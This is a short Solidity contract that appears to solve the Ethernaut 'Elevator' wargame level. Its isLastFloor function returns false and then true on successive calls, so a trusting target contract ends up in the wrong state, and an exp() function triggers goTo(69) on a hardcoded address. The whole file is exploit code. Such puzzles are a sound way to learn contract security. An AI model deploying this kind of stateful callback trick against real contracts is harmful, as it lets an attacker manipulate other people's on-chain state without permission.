pragma solidity ^0.8.0;

contract ElevatorSolver {
    bool private checked;

    constructor () {
        checked = false;
    }
    function isLastFloor(uint _f) external returns(bool) {
        if (!checked) {
            checked = true;
            return false;
            
        }else {
            return true;
        }
    }

    function getChecked() external view returns(bool) {
        return checked;
    }
    function exp() external {
        address(0x8A317D2D9F1a5bF77f68cA617be32db1ef6dDb52).call{value: 0}(abi.encodeWithSignature("goTo(uint256)", 69));
    }
}